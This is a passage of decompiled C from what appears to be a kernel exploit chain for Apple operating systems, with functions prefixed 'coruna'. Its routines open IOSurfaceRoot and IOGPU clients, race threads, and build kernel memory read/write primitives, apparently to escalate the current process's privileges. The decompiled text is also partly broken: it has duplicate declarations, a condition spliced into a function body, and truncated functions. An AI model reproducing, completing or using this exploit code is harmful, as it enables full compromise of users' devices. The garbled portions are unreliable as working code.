        *(uint64_t *)((long)block + 0x1e8) = 0;
        *(uint64_t *)((long)block + 0x1e0) = 0;
        *(uint64_t *)((long)block + 0x1f8) = 0;
        *(uint64_t *)((long)block + 0x1f0) = 0;
        *(uint64_t *)((long)block + 0x208) = 0;
        *(uint64_t *)((long)block + 0x200) = 0;
        *(uint8_t *)((long)block + 0x210) = 0;
        *(long *)((long)block + 400) = arg;
        *(long *)((long)block + 0x28) = arg;
        *(long *)((long)block + 8) = arg;
        *(void (**)((long)block + 0x10) = coruna_bzero_2;
        *(void (**)((long)block + 0x18) = coruna_ret_stub;
        *(long *)((long)block + 0x20) = (long)block + 0xf0;
        *(uint32_t *)((long)block + 0xd0) = 0;
        *(uint64_t *)((long)block + 0xd8) = 0;
        *(uint64_t *)((long)block + 0xe0) = 0;
        *(uint64_t *)((long)block + 0xe8) = 0;
        version = coruna_pthread_mutexattr_settype();
        if ((int)version != 0) {
          return version;
        }
        u = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,
                                  (semaphore_t *)((long)block + 0x1bc),0,0);
        if (u != 0) {
          return (unsigned long)(u | 0x80000000);
        }
        version = coruna_mach_port_deallocate_137e4(arg,0x12,*(uint64_t *)((long)block + 0x110),(long)block + 0x170
                            );
        if ((int)version != 0) {
          return version;
        }
        version = coruna_pthread_mutex_init(block);
        if ((int)version != 0) {
          return version;
        }
        version = coruna_getpid(block);
        if ((int)version != 0) {
          return version;
        }
        version = coruna_kernel600c_via_vm_deallocate_af48(block);
        if ((int)version != 0) {
          return version;
        }
        *(void **)(&k_kernel_slot_1d40 + arg) = block;
        *(uint64_t *)(&k_kernel_slot_19d0 + arg) = *(uint64_t *)((long)block + 0x288);
        version = coruna_open_iosurface_root_a508(block);
        if ((int)version == 0) {
          *val = 1;
          return version;
        }
        return version;
      }
      serial_10 = serial_10 + 0x1000;
    } while (serial_10 != 0x4000);
  }
  return 0;
}





uint64_t coruna_pthread_mutex_init(void *ctx)
{
  uint u;
  uint size;
  int err;
  kern_return_t lk4;
  void *ptr;
  void **lppv6;
  uint version;
  long handle;
  uint64_t port;
  unsigned long tag;
  long addr;
  uint scratch;
  
  port = 0xad009;
  size = coruna_cpu_core_count();
  u = size << 1;
  if (u < 9) {
    u = 8;
  }
  err = _pthread_mutex_init((pthread_mutex_t *)((long)ctx + 0x638),(pthread_mutexattr_t *)0x0)
  ;
  if (err == 0) {
    *(uint *)((long)ctx + 0x2c8) = u;
    ptr = _malloc((unsigned long)u << 3);
    *(void **)((long)ctx + 0x2b8) = ptr;
    if (ptr != (void *)0x0) {
      ptr = _calloc((unsigned long)size,8);
      *(void **)((long)ctx + 0x2c0) = ptr;
      if (ptr != (void *)0x0) {
        if (*(int *)((long)ctx + 0xa8) != 0) {
          tag = 0;
          do {
            addr = *(long *)((long)ctx + 0xb0) * tag;
            scratch = 0;
            port = coruna_ret_stub((long)ctx + 0xf0,*(long *)((long)ctx + 0x2b0) + addr,
                                 &scratch,0);
            if ((int)port != 0) {
              return port;
            }
            if (size <= (scratch & 0xffff)) {
              return 0xad009;
            }
            *(long *)(*(long *)((long)ctx + 0x2c0) + (unsigned long)(ushort)scratch * 8) =
                 *(long *)((long)ctx + 0x2b0) + addr;
            tag = tag + 1;
          } while (tag < *(uint *)((long)ctx + 0xa8));
        }
        *(uint32_t *)((long)ctx + 0x2e8) = 0xffffffff;
        size = 2;
        while( true ) {
          *(uint32_t *)((long)ctx + 0x2d0) = 0;
          *(uint16_t *)((long)ctx + 0x2cc) = 0;
          version = size;
          if (u <= size) {
            version = u;
          }
          *(uint64_t *)((long)ctx + 0x2d8) = 0;
          *(uint64_t *)((long)ctx + 0x2e0) = 0;
          *(uint *)((long)ctx + 0x2c8) = version;
          _bzero(*(void **)((long)ctx + 0x2b8),(unsigned long)version << 3);
          if (*(int *)((long)ctx + 0x2c8) != 0) {
            addr = 0;
            tag = 0;
            do {
              handle = *(long *)((long)ctx + 0x2b8);
              lppv6 = (void **)coruna_fn_ptr_cast(coruna_pthread_mach_thread_np);
              err = _pthread_create((pthread_t *)(handle + addr),(pthread_attr_t *)0x0,lppv6,
                                      ctx);
              if (err != 0) {
                return 0xad022;
              }
              tag = tag + 1;
              addr = addr + 8;
            } while (tag < *(uint *)((long)ctx + 0x2c8));
          }
          port = coruna_vm_map_e0c0((long)ctx + 0x10);
          if ((int)port != 0) break;
          *(uint8_t *)((long)ctx + 0x2cc) = 1;
          while (version = *(uint *)((long)ctx + 0x2c8), *(uint *)((long)ctx + 0x2d0) < version)
          {
            _thread_switch(0,2,1);
          }
          if (version != 0) {
            tag = 0;
            do {
              if (tag != *(uint *)((long)ctx + 0x2e8)) {
                err = _pthread_join(*(pthread_t *)(*(long *)((long)ctx + 0x2b8) + tag * 8),
                                      (void **)0x0);
                if (err != 0) {
                  return 0xad022;
                }
                version = *(uint *)((long)ctx + 0x2c8);
              }
              tag = tag + 1;
            } while (tag < version);
          }
          size = size << (size < u);
          if (*(int *)((long)ctx + 0x2e8) != -1) {
            lk4 = _thread_suspend(*(thread_act_t *)((long)ctx + 0x300));
            if (lk4 != 0) {
              return 0xad022;
            }
            *(uint8_t *)((long)ctx + 0x634) = 1;
            *(uint8_t *)((long)ctx + 0x304) = 1;
            return 0;
          }
        }
        *(uint16_t *)((long)ctx + 0x2cc) = 0x101;
        if (*(int *)((long)ctx + 0x2c8) != 0) {
          tag = 0;
          do {
            _pthread_join(*(pthread_t *)(*(long *)((long)ctx + 0x2b8) + tag * 8),(void **)0x0
                         );
            tag = tag + 1;
          } while (tag < *(uint *)((long)ctx + 0x2c8));
        }
      }
    }
  }
  return port;
}





void coruna_getpid(long handle)
{
  unsigned long u;
  int err;
  pid_t lp3;
  long handle;
  long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  
  bootargs = 0;
  thread_attr = 0;
  err = coruna_kernel600c_via_ioservicegetmatchingservice_4(handle + 0xf0,*(uint64_t *)(handle + 0x2a8),0,&thread_attr);
  if ((((err == 0) &&
       (handle = *(long *)(handle + 8), *(unsigned long *)(&k_kernel_slot_19e8 + handle) <= thread_attr)) &&
      (thread_attr < *(unsigned long *)(&k_kernel_slot_19f0 + handle))) &&
     ((*(unsigned long *)(handle + 0x158) < 0x1f530f02800000 ||
      (((err = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,thread_attr + 0x20,&thread_attr,0), err == 0 &&
        (handle = *(long *)(handle + 8), *(unsigned long *)(&k_kernel_slot_19e8 + handle) <= thread_attr)) &&
       (thread_attr < *(unsigned long *)(&k_kernel_slot_19f0 + handle))))))) {
    if (*(int *)(handle + 0x140) < 0x2258) {
      err = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,thread_attr + *(uint *)(handle + 0x250),&bootargs,0);
      if (err != 0) {
        return;
      }
      handle = *(long *)(handle + 8);
    }
    else {
      bootargs = thread_attr - *(uint *)(handle + 0x250);
    }
    u = bootargs;
    if ((*(unsigned long *)(&k_kernel_slot_19e8 + handle) <= bootargs) &&
       (bootargs < *(unsigned long *)(&k_kernel_slot_19f0 + handle))) {
      lp3 = _getpid();
      err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_3(handle,u,lp3);
      if ((err != 0) &&
         ((err == 0x3f005 &&
          (err = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,thread_attr + *(uint *)(handle + 0x290),&scratch,0),
          err == 0)))) {
        if (*(int *)(*(long *)(handle + 8) + 0x140) < 0x2258) {
          err = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,scratch + (unsigned long)*(uint *)(handle + 0x250),&bootargs,0);
          if (err != 0) {
            return;
          }
        }
        else {
          bootargs = scratch - (unsigned long)*(uint *)(handle + 0x250);
        }
        u = bootargs;
        lp3 = _getpid();
        coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_3(handle,u,lp3);
      }
    }
  }
  return;
}





uint64_t coruna_kernel600c_via_vm_deallocate_af48(long handle)
{
  uint64_t u;
  long scratch;
  
  scratch = 0;
  u = coruna_memmem(handle,*(uint64_t *)(handle + 0x2f0),&scratch);
  if ((int)u == 0) {
    if (scratch == *(long *)(handle + 0x2f8)) {
      coruna_vm_deallocate_af48(handle + 0x10);
      u = 0;
    }
    else {
      u = 0xad022;
    }
  }
  return u;
}





uint8_t * coruna_open_iosurface_root_a508(long handle)
{
  int *err;
  uint u;
  long handle;
  uint size;
  mach_port_t lm5;
  int err;
  unsigned long *ptr;
  void **lppv8;
  unsigned long version;
  long addr;
  uint64_t port;
  long off;
  unsigned long tag;
  pthread_t p_Var14;
  pthread_t *pp_Var15;
  uint64_t *buf;
  uint *str;
  uint8_t *copy;
  void *ptr;
  uint8_t *data;
  unsigned long *obj;
  unsigned long scratch;
  long bootargs;
  long thread_attr;
  long host_info;
  uint serial_buf;
  unsigned long action [16];
  pthread_t block_ctx [17];
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  copy = (uint8_t *)0xad022;
  str = *(uint **)(handle + 8);
  tag = *(unsigned long *)(str + 0x56);
  if (tag >> 0x2b < 1099) {
    data = (uint8_t *)0xad008;
    if ((0x1f530f027fffff < tag) && ((*str & 0x5584001) != 0 || 0x1f5418ffffffff < tag)) {
      action[0] = 0;
      serial_buf = 0;
      thread_attr = 0;
      host_info = 0;
      scratch = 0;
      bootargs = 0;
      err = _pthread_mutex_init((pthread_mutex_t *)(handle + 0x6d0),(pthread_mutexattr_t *)0x0);
      if (err == 0) {
        off = 0x100;
        if ((int)str[0x50] < 0x2258) {
          off = 0x118;
        }
        handle = 0x108;
        if ((int)str[0x50] < 0x2258) {
          handle = 0x120;
        }
        addr = _IOServiceMatching("IOSurfaceRoot");
        data = copy;
        if (addr != 0) {
          port = _IOServiceGetMatchingService
                             (*(uint32_t *)k_kernel_kiomasterportdefault_slot,addr);
          *(int *)(handle + 0x67c) = (int)port;
          if (1 < (int)port + 1U) {
            err = (int *)(handle + 0x680);
            err = _IOServiceOpen(port,*(uint32_t *)k_kernel_mach_task_self_slot,0,err);
            if ((err == 0) && (1 < *err + 1U)) {
              addr = coruna_kernel600c_via_return_zero_28118(*(uint64_t *)(handle + 8));
              *(long *)(handle + 0x688) = addr;
              if (addr != 0) {
                err = 8;
                copy = (uint8_t *)0x28011;
                do {
                  data = (uint8_t *)coruna_dlopen_iosurface_c104(str,*err,&serial_buf);
                  if (((int)data != 0) ||
                     (data = (uint8_t *)
                                coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,*(long *)(handle + 0x688) + handle,action,1)
                     , size = serial_buf, (int)data != 0)) break;
                  if (action[0] <= serial_buf) {
                    data = (uint8_t *)0x28011;
                    break;
                  }
                  data = (uint8_t *)
                            coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,*(long *)(handle + 0x688) + off,&thread_attr,0);
                  if ((int)data != 0) break;
                  addr = coruna_ptr_canonicalize(str,thread_attr);
                  if (addr == 0) {
fail:
                    data = (uint8_t *)0x28026;
                    break;
                  }
                  data = (uint8_t *)
                            coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,thread_attr + (unsigned long)(size << 3),&bootargs,0);
                  if ((int)data != 0) break;
                  addr = coruna_ptr_canonicalize(str,bootargs);
                  data = (uint8_t *)0x28026;
                  break;
                } while (err != 0);
              }
            }
          }
        }
      }
      else {
        data = (uint8_t *)0xad009;
      }
    }
  }
  else {
    tag = 0;
    block_ctx[0xd] = (pthread_t)0x0;
    block_ctx[0xc] = (pthread_t)0x0;
    block_ctx[0xf] = (pthread_t)0x0;
    block_ctx[0xe] = (pthread_t)0x0;
    data = (uint8_t *)0x28026;
    block_ctx[9] = (pthread_t)0x0;
    block_ctx[8] = (pthread_t)0x0;
    block_ctx[0xb] = (pthread_t)0x0;
    block_ctx[10] = (pthread_t)0x0;
    block_ctx[5] = (pthread_t)0x0;
    block_ctx[4] = (pthread_t)0x0;
    block_ctx[7] = (pthread_t)0x0;
    block_ctx[6] = (pthread_t)0x0;
    block_ctx[1] = (pthread_t)0x0;
    block_ctx[0] = (pthread_t)0x0;
    block_ctx[3] = (pthread_t)0x0;
    block_ctx[2] = (pthread_t)0x0;
    action[0xd] = 0;
    action[0xc] = 0;
    action[0xf] = 0;
    action[0xe] = 0;
    action[9] = 0;
    action[8] = 0;
    action[0xb] = 0;
    action[10] = 0;
    action[5] = 0;
    action[4] = 0;
    action[7] = 0;
    action[6] = 0;
    action[1] = 0;
    action[0] = 0;
    action[3] = 0;
    action[2] = 0;
    do {
      ptr = _calloc(1,0x30);
      action[tag] = (unsigned long)ptr;
      if (ptr == (unsigned long *)0x0) {
        data = (uint8_t *)0xad009;
        goto done;
      }
      lppv8 = (void **)coruna_fn_ptr_cast(coruna_return_zero_d558);
      size = _pthread_create(block_ctx + tag,(pthread_attr_t *)0x0,lppv8,ptr);
      if (size != 0) {
        ptr = (unsigned long *)0x0;
        u = -size;
        if (-1 < (int)size) {
          u = size;
        }
        data = (uint8_t *)(unsigned long)(u | 0x40000000);
cleanup:
        if ((int)tag < 1) goto check_ok;
        pp_Var15 = block_ctx;
        obj = action;
        tag = tag & 0xffffffff;
        do {
        ptr = (void *)*obj;
        if (((ptr != (void *)0x0) && (1 < *(int *)((long)ptr + 0x18) + 1U)) &&
        (*pp_Var15 != (pthread_t)0x0)) {
        *(uint8_t *)((long)ptr + 0x28) = 1;
        ___ulock_wake(0x201,(long)ptr + 0x1c);
        _pthread_join(*pp_Var15,(void **)0x0);
        *pp_Var15 = (pthread_t)0x0;
        _free(ptr);
        *obj = 0;
        }
        pp_Var15 = pp_Var15 + 1;
        obj = obj + 1;
        tag = tag - 1;
        } while (tag != 0);
      }
      lm5 = _pthread_mach_thread_np(block_ctx[tag]);
      if (lm5 + 1 < 2) {
        data = (uint8_t *)0x28008;
done:
        ptr = (unsigned long *)0x0;
        goto cleanup;
      }
      *(mach_port_t *)(ptr + 3) = lm5;
      if (*(char *)((long)ptr + 0x29) == '\0') {
        err = 0x3ea;
        do {
          err = err + -1;
          if (err == 0) {
            ptr = (unsigned long *)0x0;
            data = &k_kernel_slot_1001;
            goto cleanup;
          }
          coruna_semaphore_timedwait(str,1000);
        } while (*(char *)((long)ptr + 0x29) == '\0');
      }
      version = coruna_kernel600c_via_return_zero_28118(str,lm5);
      if (version == 0) goto done;
      if (((version + 0x5f0 ^ version) & (*(unsigned long *)(str + 0x62) ^ 0xffffffffffffffff)) == 0) {
        data = (uint8_t *)0x0;
        p_Var14 = block_ctx[tag];
        action[tag] = 0;
        block_ctx[tag] = (pthread_t)0x0;
        tag = (unsigned long)((int)tag + 1);
        *ptr = version;
        ptr[2] = (unsigned long)p_Var14;
        goto cleanup;
      }
      tag = tag + 1;
    } while (tag != 0x10);
    ptr = (unsigned long *)0x0;
    data = (uint8_t *)0xad011;
skip:
    pp_Var15 = block_ctx;
    obj = action;
    tag = tag & 0xffffffff;
    do {
      ptr = (void *)*obj;
      if (((ptr != (void *)0x0) && (1 < *(int *)((long)ptr + 0x18) + 1U)) &&
         (*pp_Var15 != (pthread_t)0x0)) {
        *(uint8_t *)((long)ptr + 0x28) = 1;
        ___ulock_wake(0x201,(long)ptr + 0x1c);
        _pthread_join(*pp_Var15,(void **)0x0);
        *pp_Var15 = (pthread_t)0x0;
        _free(ptr);
        *obj = 0;
      }
      pp_Var15 = pp_Var15 + 1;
      obj = obj + 1;
      tag = tag - 1;
    } while (tag != 0);
check_ok:
    if ((int)data == 0) {
      *(unsigned long **)(str + 0x752) = ptr;
      buf = *(uint64_t **)(&k_kernel_slot_1d48 + *(long *)(handle + 8));
      data = (uint8_t *)coruna_memmem(handle,*buf,buf + 1);
      if ((int)data == 0) {
        size = _pthread_mutex_init((pthread_mutex_t *)(handle + 0x6d0),(pthread_mutexattr_t *)0x0)
        ;
        if (size == 0) {
          err = coruna_ctx_test_flag(*(uint64_t *)(handle + 8),0x5584201);
          if ((err == 0) ||
             ((data = (uint8_t *)coruna_kernel600c_via_ioregistryentryfrompath(*(uint64_t *)(handle + 8),0),
              (int)data == 0 &&
              (data = (uint8_t *)
                         coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full_3(*(uint64_t *)(handle + 8),*(uint32_t *)(buf + 3),1,0,
                                      0x60), (int)data == 0)))) {
            *(uint16_t *)(handle + 0x678) = 0x101;
            data = (uint8_t *)0x0;
          }
        }
        else {
          u = -size;
          if (-1 < (int)size) {
            u = size;
          }
          data = (uint8_t *)(unsigned long)(u | 0x40000000);
        }
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail();
  }
  return data;
}





uint64_t coruna_pthread_join(long handle)
{
  uint64_t u;
  uint64_t *ptr;
  
  if (*(long *)(&k_kernel_slot_1d40 + handle) != 0) {
    *(uint64_t *)(&k_kernel_slot_1d40 + handle) = 0;
    u = coruna_pthread_from_mach_thread_np();
    if ((int)u != 0) {
      return u;
    }
  }
  ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
  if (ptr != (uint64_t *)0x0) {
    *(uint64_t *)(&k_kernel_slot_1d48 + handle) = 0;
    *(uint8_t *)(ptr + 5) = 1;
    ___ulock_wake(0x201,(long)ptr + 0x1c,*(uint32_t *)(ptr + 3));
    _pthread_join((pthread_t)ptr[2],(void **)0x0);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    ptr[5] = 0;
    ptr[4] = 0;
    _free(ptr);
  }
  return 0;
}





unsigned long coruna_kernel600c_via_kptr_in_mapped_range(long arg,uint64_t val,uint64_t n,uint32_t m)

{
  uint type_id_21;
  long base;
  unsigned long u;
  
  type_id_21 = 0xad001;
  if (*(long *)(&k_kernel_slot_1d40 + arg) == 0) {
    type_id_21 = 0xad022;
  }
  else {
    base = coruna_kptr_in_mapped_range();
    if (base != 0) {
      u = coruna_shmem_rw_locked(*(uint64_t *)(&k_kernel_slot_1d40 + arg),val,m,n);
      return u;
    }
  }
  return (unsigned long)type_id_21;
}





uint64_t coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice(long handle,unsigned long arg,uint32_t *size,uint size_x)
{
  long handle;
  size_t ls2;
  unsigned long u;
  int err;
  long addr;
  uint64_t size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  long off;
  unsigned long type_id;
  size_t ls13;
  long base;
  long scratch;
  
  if (*(long *)(&k_kernel_slot_1d40 + handle) == 0) {
    return 0xad022;
  }
  addr = coruna_kptr_in_mapped_range();
  if (addr == 0) {
    return 0xad001;
  }
  addr = *(long *)(&k_kernel_slot_1d40 + handle);
  tag = (unsigned long)size_x;
  if (*(char *)(addr + 0x678) == '\0') {
    port = *(unsigned long *)k_kernel_vm_page_mask_slot;
    kind = arg & (port ^ 0xffffffffffffffff);
    tag = tag + arg;
    version = tag & (port ^ 0xffffffffffffffff);
    if (kind <= version) {
      type_id = port & arg;
      port = port & tag;
      if (kind != version) {
        port = *(long *)k_kernel_vm_page_size_slot - 1;
      }
      off = port - type_id;
      if (off != 0) {
        port = kind;
        do {
          if (*(char *)(addr + 0x304) == '\0') {
            size = coruna_kernel600c_via_vm_map_e0c0(addr + 0x10,port,&scratch);
            err = (int)size;
          }
          else {
            size = coruna_memmem(addr,port,&scratch);
            err = (int)size;
          }
          if (err != 0) {
            return size;
          }
          if (scratch == 0) {
            return 0x3f005;
          }
          size = coruna_kernel600c_via_ioservicegetmatchingservice(addr + 0xf0,scratch + type_id,off,size);
          if ((int)size != 0) {
            return size;
          }
          port = *(long *)k_kernel_vm_page_size_slot + port;
          if (version < port) break;
          size = (uint32_t *)((long)size + off);
          type_id = *(unsigned long *)k_kernel_vm_page_mask_slot & arg;
          if (port != kind) {
            type_id = 0;
          }
          u = *(unsigned long *)k_kernel_vm_page_mask_slot & tag;
          if (port != version) {
            u = *(long *)k_kernel_vm_page_size_slot - 1;
          }
          off = u - type_id;
        } while (off != 0);
        goto fail;
      }
    }
    size = 0xffffffff;
  }
  else {
    if ((((arg & 3) == 0) && (size_x == 4)) && (*(char *)(addr + 0x679) != '\0')) {
      size = coruna_thread_switch(addr,arg,*size);
      return size;
    }
    kind = arg & 0xfffffffffffffff8;
    version = arg & 7;
    port = (version + tag + 7 & 0x1fffffff8) + kind;
    ls2 = tag;
    if (8 - version <= tag) {
      ls2 = 8 - version;
    }
    if (kind < port) {
      off = 0;
      base = 0;
      do {
        handle = kind + off;
        if ((kind == arg) || (off != 0)) {
          if (((size_x + (int)arg & 7) == 0) || (handle + 8U < port)) {
            ls13 = tag - base;
            if (7 < ls13) {
              ls13 = 8;
            }
          }
          else {
            size = coruna_kernel600c_via_thread_get_state(addr,handle,&scratch,1);
            if ((int)size != 0) {
              return size;
            }
            ls13 = tag - base;
          }
          ___memcpy_chk(&scratch,(long)size + base,ls13,8);
        }
        else {
          size = coruna_kernel600c_via_thread_get_state(addr,kind,&scratch,1);
          if ((int)size != 0) {
            return size;
          }
          _memcpy((void *)((unsigned long)&scratch | version),(void *)((long)size + base),ls2);
          ls13 = ls2;
        }
        size = coruna_ioconnectcallscalarmethod(addr,handle,scratch);
        if ((int)size != 0) {
          return size;
        }
        base = ls13 + base;
        off = off + 8;
      } while (kind + off < port);
    }
fail:
    size = 0;
  }
  return size;
}





unsigned long coruna_kernel600c_via_ioconnectcallscalarmethod(long arg,uint64_t val,uint64_t n)

{
  uint type_id_21;
  long base;
  unsigned long u;
  
  type_id_21 = 0xad001;
  if (*(long *)(&k_kernel_slot_1d40 + arg) == 0) {
    type_id_21 = 0xad022;
  }
  else {
    base = coruna_kptr_in_mapped_range();
    if (base != 0) {
      base = *(long *)(&k_kernel_slot_1d40 + arg);
      if (*(char *)(base + 0x678) != '\0') {
        u = coruna_ioconnectcallscalarmethod(base,val,n);
        return u;
      }
      u = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_5(base,val,n);
      return u;
    }
  }
  return (unsigned long)type_id_21;
}
void coruna_ioconnectcallscalarmethod(long handle)
{
  uint64_t *ptr;
  long *ptr;
  uint u;
  uint32_t size;
  uint32_t version;
  uint8_t size[16];
  unsigned long port;
  unsigned long *buf;
  bool err;
  int err;
  kern_return_t lk11;
  int status;
  void *buf;
  void *str;
  void *copy;
  uint *str;
  unsigned long tag;
  unsigned long kind;
  long handle;
  uint64_t *copy;
  long addr;
  unsigned long type_id;
  uint64_t type_id_8;
  unsigned long *data;
  unsigned long type_id_9;
  unsigned long type_id_10;
  unsigned long type_id_11;
  unsigned long type_id_12;
  byte *data;
  int *err;
  byte *obj;
  long off;
  long base;
  long *block;
  unsigned long type_id_13;
  int *status;
  char *ptr;
  uint8_t *obj;
  unsigned long type_id_14;
  unsigned long type_id_15;
  long ctx_val;
  long serial;
  uint64_t *block;
  uint type_id_16;
  uint64_t type_id_17;
  uint64_t type_id_18;
  uint64_t type_id_19;
  uint64_t type_id_20;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  long host_info;
  long serial_buf;
  long action;
  long block_ctx;
  long stack_guard [3];
  vm_address_t sa_saved;
  uint64_t scratch;
  uint64_t sa_new;
  unsigned long path_buf;
  uint64_t bootargs;
  uint64_t tmp_buf;
  uint64_t region;
  uint8_t plist[12];
  uint32_t url_buf;
  unsigned long json_buf [2];
  unsigned long frame;
  unsigned long thread_attr;
  vm_prot_t work;
  uint32_t host_info;
  uint cache;
  unsigned long cache_20 [2];
  unsigned long *cache_21;
  uint64_t serial_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t action;
  uint64_t cache_24;
  uint64_t block_ctx;
  uint64_t cache_25;
  uint64_t stack_guard;
  uint64_t cache_26;
  uint64_t sa_saved;
  uint64_t cache_27;
  uint64_t sa_new;
  uint64_t cache_28;
  uint64_t path_buf;
  uint64_t cache_29;
  uint64_t tmp_buf;
  uint64_t cache_30;
  uint64_t region;
  uint64_t cache_31;
  uint64_t plist;
  uint64_t cache_32;
  uint64_t url_buf;
  uint64_t cache_33;
  uint64_t json_buf;
  uint64_t cache_34;
  uint64_t frame;
  uint64_t cache_35;
  uint64_t work;
  uint64_t cache_36;
  uint64_t cache;
  uint64_t cache_37;
  uint64_t cache_20;
  uint64_t cache_38;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  unsigned long cache_24;
  uint64_t cache_25;
  uint64_t cache_41;
  uint64_t cache_26;
  uint64_t cache_42;
  uint64_t cache_27;
  uint64_t cache_43;
  uint64_t cache_28;
  uint64_t cache_44;
  uint64_t cache_29;
  uint64_t cache_45;
  uint64_t cache_30;
  uint64_t cache_46;
  uint64_t cache_31;
  uint64_t cache_47;
  uint64_t cache_32;
  uint64_t cache_48;
  uint64_t cache_33;
  uint64_t cache_49;
  uint64_t cache_34;
  uint64_t cache_50;
  long cache_51;
  uint64_t cache_52;
  uint64_t cache_35;
  uint64_t cache_53;
  uint64_t cache_36;
  uint64_t cache_54;
  uint64_t cache_37;
  uint64_t cache_55;
  uint64_t cache_38;
  uint64_t cache_56;
  uint64_t cache_57;
  uint64_t cache_39;
  uint32_t cache_58;
  uint32_t cache_40;
  uint32_t cache_41;
  unsigned long cache_59;
  long cache_60;
  int *flags;
  
  cache_60 = *(long *)k_kernel_stack_chk_guard_slot;
  if ((((*(unsigned long *)(handle + 0x158) < 0x225c23801af00d) ||
       (err = coruna_fn_ptr_cast_10(handle,0x5184000), err == 0)) ||
      (*(long *)(&k_kernel_slot_1d58 + handle) != 0)) ||
     if (*(long *)k_kernel_stack_chk_guard_slot == cache_60) {
     return;
     }
     ___stack_chk_fail();
}





uint64_t coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_5(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  uint64_t u;
  long scratch;
  
  scratch = 0;
  if (*(char *)(handle + 0x304) == '\0') {
    u = coruna_kernel600c_via_vm_map_e0c0(handle + 0x10,val,&scratch);
    err = (int)u;
  }
  else {
    u = coruna_memmem(handle,val,&scratch);
    err = (int)u;
  }
  if (err == 0) {
    if (scratch == 0) {
      u = 0x3f005;
    }
    else {
      u = coruna_kernel600c_via_ioservicegetmatchingservice_5(handle + 0xf0,scratch,id_2);
    }
  }
  return u;
}





uint64_t coruna_ioservicegetmatchingservice_b540(long handle)
{
  uint32_t u;
  int err;
  uint64_t size;
  long handle;
  long addr;
  long off;
  mach_port_name_t name;
  long base;
  bool err;
  uint64_t version;
  unsigned long scratch;
  mach_port_name_t bootargs;
  uint32_t scratch;
  uint64_t thread_attr;
  long host_info;
  uint64_t serial_buf;
  uint64_t action;
  long block_ctx;
  
  size = coruna_mach_absolute_time_1c000(handle,2,&k_kernel_slot_2710);
  if ((int)size != 0) {
    return size;
  }
  action = 0;
  block_ctx = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  base = *(long *)(&k_kernel_slot_1d40 + handle);
  if (base == 0) {
    size = 0xad022;
    coruna_slot_clear(handle,2);
    return size;
  }
  bootargs = 0;
  coruna_ioconnectcallstructmethod(handle,&bootargs);
  if (bootargs + 1 < 2) {
    bootargs = 0;
    u = *(uint32_t *)k_kernel_kiomasterportdefault_slot;
    size = _IOServiceMatching("IOGPU");
    size = _IOServiceGetMatchingService(u,size);
    if (1 < (int)size + 1U) {
      _IOServiceOpen(size,*(uint32_t *)k_kernel_mach_task_self_slot,1,&bootargs);
      _IOObjectRelease(size);
      if (1 < bootargs + 1) {
        err = false;
        goto done;
      }
    }
    size = 0x28008;
    coruna_slot_clear(handle,2);
    return size;
  }
  if ((((*(long *)(base + 0x6c0) != 0) && (*(long *)(base + 0x6a8) != 0)) &&
      (*(long *)(base + 0x6b0) != 0)) && (name = bootargs, *(long *)(base + 0x6b8) != 0))
  *(mach_port_name_t *)(base + 0x680) = name;
  *(uint8_t *)(base + 0x67a) = 1;
  size = coruna_slot_clear(handle,2);
  return size;
}





void coruna_kernel600c_via_ctx_test_flag_2(long handle,unsigned long arg)
{
  uint8_t *ptr;
  int err;
  unsigned long u;
  long handle;
  uint64_t scratch;
  uint bootargs;
  void *thread_attr;
  uint host_info;
  void *serial_buf;
  char action [8];
  uint5 scratch;
  uint32_t bootargs;
  void *block_ctx;
  unsigned long thread_attr;
  long stack_guard;
  
  ptr = k_kernel_mach_task_self_slot;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  u = coruna_kernel600c_via_kernel600c_via_return_zero_1f078_3(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
  return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_kernel600c_residual_217(long handle,long addr_2,long off_3,uint size)
{
  uint u;
  unsigned long size;
  uint64_t version;
  uint port;
  uint64_t tag;
  unsigned long kind;
  unsigned long type_id;
  uint8_t scratch[8];
  
  if (size != 0) {
    kind = 0;
    tag = *(uint64_t *)(handle + 0x50);
    port = size;
    do {
      type_id = (unsigned long)port;
      size = addr_2 + kind & 7;
      if (size == 0) {
        if (7 < type_id) {
          type_id = 8;
        }
      }
      else if (8 - size <= type_id) {
        type_id = 8 - size;
      }
      version = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(tag,addr_2 + kind & 0xfffffffffffffff8,scratch,1);
      if ((int)version != 0) {
        return version;
      }
      _memcpy((void *)(off_3 + kind),(void *)((unsigned long)scratch | size),type_id);
      port = port - (int)type_id;
      u = ((int)kind - (int)size) + 8;
      kind = (unsigned long)u;
    } while (u < size);
  }
  return 0;
}





uint32_t coruna_return_zero_be60(long handle)
{
  int err;
  uint64_t u;
